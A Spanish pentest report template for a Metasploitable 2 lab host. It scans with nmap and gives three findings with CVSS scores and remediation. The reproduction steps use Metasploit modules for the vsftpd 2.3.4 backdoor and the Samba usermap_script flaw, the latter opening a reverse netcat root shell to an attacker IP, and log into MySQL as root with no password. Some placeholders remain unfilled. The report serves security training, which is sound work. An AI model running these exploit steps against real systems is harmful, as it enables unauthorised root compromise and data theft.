# Informe Técnico — Test de Intrusión "Servidor Interno" (Auditoría #1)

| | |
|---|---|
| **Cliente / Alcance** | ACME Corp (ficticio) — servidor interno · `192.168.56.104` |
| **Sistema real** | Metasploitable 2 (laboratorio vulnerable, red host-only) |
| **Tipo de prueba** | Caja negra, sin credenciales (red interna) |
| **Metodología** | OWASP / PTES |
| **Autor** | [Tu nombre] |
| **Fecha** | 2026-11-26 · Versión 1.0 |

> ⚠️ Laboratorio aislado host-only, máquina vulnerable a propósito, con fines educativos.

## 1. Alcance y objetivos
- **Objetivo:** identificar y explotar vulnerabilidades alcanzables en red interna sobre el host `192.168.56.104`.
- **En alcance:** todos los servicios de red del host.
- **Fuera de alcance:** DoS, otros hosts de la red.

## 2. Metodología
Reconocimiento → Escaneo/Enum → Análisis de vulns → Explotación → Post-explotación → Informe.

## 3. Herramientas
| Herramienta | Uso |
|---|---|
| nmap | Escaneo de puertos/servicios/versiones |
| searchsploit | Buscar exploits por servicio+versión |
| Metasploit (msfconsole) | Explotación |
| (otras según hallazgo) | |

## 4. Reconocimiento y escaneo (Fase 2-3)

**Comando usado:**
```
nmap -sC -sV 192.168.56.104
```

**Salida (pegar aquí la real):**
```
[PEGAR SALIDA DE NMAP]
```

## 5. Análisis de vulnerabilidades (Fase 4) — candidatas a verificar

> Servicios típicos de este objetivo y el fallo que suele tener cada uno. Se **confirma** en la Fase 5.

| Puerto | Servicio/versión | Vulnerabilidad candidata | Severidad prev. |
|---|---|---|:---:|
| 21 | vsftpd 2.3.4 | Backdoor (CVE-2011-2523) → RCE root | 🔴 |
| 139/445 | Samba 3.0.20 | `usermap_script` (CVE-2007-2447) → RCE root | 🔴 |
| 6667 | UnrealIRCd 3.2.8.1 | Backdoor (CVE-2010-2075) → RCE | 🔴 |
| 1524 | bindshell | Shell root abierta (backdoor) | 🔴 |
| 3306 | MySQL 5.0.51a | root sin/con contraseña débil | 🟠 |
| 5900 | VNC | Contraseña débil (`password`) | 🟠 |
| 8180 | Tomcat | Credenciales por defecto → deploy WAR → RCE | 🟠 |
| 80 | Apache 2.2.8 / PHP 5.2.4 | Apps web vulnerables (DVWA, Mutillidae) | 🟠 |

## 6. Hallazgos detallados (Fase 5)

**Resumen:**

| ID | Hallazgo | Severidad | CVSS |
|---|---|:---:|:---:|
| F-01 | Puerta trasera en FTP (vsftpd 2.3.4) | 🔴 Crítica | 9.8 |
| F-02 | MySQL con root sin contraseña | 🟠 Alta | 8.6 |
| F-03 | Ejecución de comandos en Samba (usermap_script) | 🔴 Crítica | 9.8 |

### F-01 · Puerta trasera en servidor FTP (vsftpd 2.3.4) — 🔴 Crítica

| Campo | Valor |
|---|---|
| **CVSS 3.1** | 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) — RCE no autenticado |
| **Componente** | Servicio FTP — 21/tcp |
| **CVE** | CVE-2011-2523 |

**Descripción.** El servidor ejecuta **vsftpd 2.3.4**, versión que contiene una puerta trasera: al autenticarse con un usuario cuyo nombre termina en `:)`, el servicio abre un intérprete de comandos con privilegios de **root** en el puerto 6200/tcp.

**Pasos de reproducción (PoC):**
```
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.104
set LHOST 192.168.56.XXX        # IP del equipo atacante (Kali)
run
getuid   ->  uid=0 (root)
```

![Evidencia F-01: getuid devolviendo root](EVIDENCIA_f01_root.png)
*Pie: sesión obtenida con privilegios de root (`uid=0`).*

**Impacto.** Compromiso **total** del servidor por un atacante no autenticado en la red: acceso a todos los datos, modificación/borrado de ficheros, instalación de malware y uso del host como punto de pivote hacia el resto de la red interna.

**Remediación.**
- Actualizar vsftpd a una versión íntegra (la 2.3.4 distribuida estaba troyanizada).
- Restringir el acceso al servicio FTP por firewall (solo IPs autorizadas).
- Sustituir FTP por **SFTP/FTPS** (cifrado) y deshabilitar el servicio si no es necesario.

**Referencias:** CVE-2011-2523; CWE-78 (OS Command Injection).

### F-02 · Base de datos MySQL con `root` sin contraseña — 🟠 Alta

| Campo | Valor |
|---|---|
| **CVSS 3.1** | 8.6 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`) |
| **Componente** | MySQL — 3306/tcp |
| **CWE** | CWE-521 / CWE-1188 (credenciales débiles / config insegura) |

**Descripción.** El servicio MySQL acepta el inicio de sesión del usuario `root` **sin contraseña** desde la red, concediendo control total de la base de datos a cualquier atacante.

**Pasos de reproducción (PoC):**
```
mysql -h 192.168.56.104 -u root --skip-ssl
show databases;
```
(`--skip-ssl` evita el error TLS del cliente moderno contra el MySQL antiguo.)

![Evidencia F-02: prompt mysql> y listado de bases de datos](EVIDENCIA_f02_mysql.png)
*Pie: acceso como root sin contraseña y enumeración de bases de datos.*

**Impacto.** Lectura, modificación o borrado de **todos los datos** de la aplicación (usuarios, credenciales, pedidos…) por cualquier equipo de la red.

**Remediación.**
- Asignar una **contraseña fuerte** a `root` y a todas las cuentas de MySQL.
- Enlazar el servicio a `localhost` o restringir 3306 por firewall.
- Eliminar usuarios anónimos y aplicar **mínimos privilegios**.

**Referencias:** CWE-521; OWASP ASVS V2.

### F-03 · Ejecución de comandos en Samba (`usermap_script`) — 🔴 Crítica

| Campo | Valor |
|---|---|
| **CVSS 3.1** | 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) — RCE no autenticado |
| **Componente** | Samba 3.0.20 — 139/445 tcp |
| **CVE** | CVE-2007-2447 |

**Descripción.** Samba 3.0.20 pasa el nombre de usuario recibido a un script del sistema (`username map script`) **sin sanearlo**. Un atacante puede incluir metacaracteres de shell en el nombre de usuario y lograr **ejecución de comandos** como **root**, sin autenticación.

**Pasos de reproducción (PoC):**
```
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.104
set payload cmd/unix/reverse_netcat
set LHOST 192.168.56.XXX        # IP del atacante (Kali)
run
whoami   ->  root
id       ->  uid=0(root) gid=0(root)
```

![Evidencia F-03: whoami/id devolviendo root por Samba](EVIDENCIA_f03_samba.png)
*Pie: shell root obtenida a través de Samba (vector independiente del FTP).*

**Impacto.** Segundo camino **independiente** a control total (root) del servidor. Confirma que el compromiso no depende de un único fallo: aunque se corrigiera el FTP, el host seguiría cayendo por Samba.

**Remediación.**
- Actualizar Samba a una versión mantenida.
- Deshabilitar `username map script` si no es imprescindible.
- Restringir el acceso a SMB (139/445) por firewall a redes de confianza.

**Referencias:** CVE-2007-2447; CWE-78.

## 7. Conclusiones

El host **192.168.56.104** presenta vulnerabilidades **críticas** que permiten a un atacante **no autenticado** en la red interna obtener **control total (root)** por **dos vías independientes** (FTP vsftpd 2.3.4 y Samba 3.0.20), además de **acceso total a la base de datos** MySQL sin contraseña.

**Causa raíz común:** software **obsoleto y sin mantenimiento** y **configuraciones inseguras por defecto**. No es un fallo puntual, sino una falta de *hardening* y de gestión de parches.

**Prioridad de corrección:**
1. Dar de baja o actualizar el sistema (el software es de hace años y troyanizado en el caso de vsftpd).
2. Aplicar contraseñas y restringir servicios (MySQL, SMB, FTP) por firewall.
3. **Re-evaluar** tras la remediación para verificar que los vectores quedan cerrados.

> Nota: se enumeraron servicios adicionales potencialmente vulnerables (sección 5: UnrealIRCd, Tomcat, VNC, distcc, apps web). No se explotaron en este alcance, pero deberían revisarse en una segunda fase.

## 8. Anexos
- Salida completa de nmap, capturas de cada explotación.

---
<sub>Confidencial. Laboratorio autorizado, fines educativos.</sub>
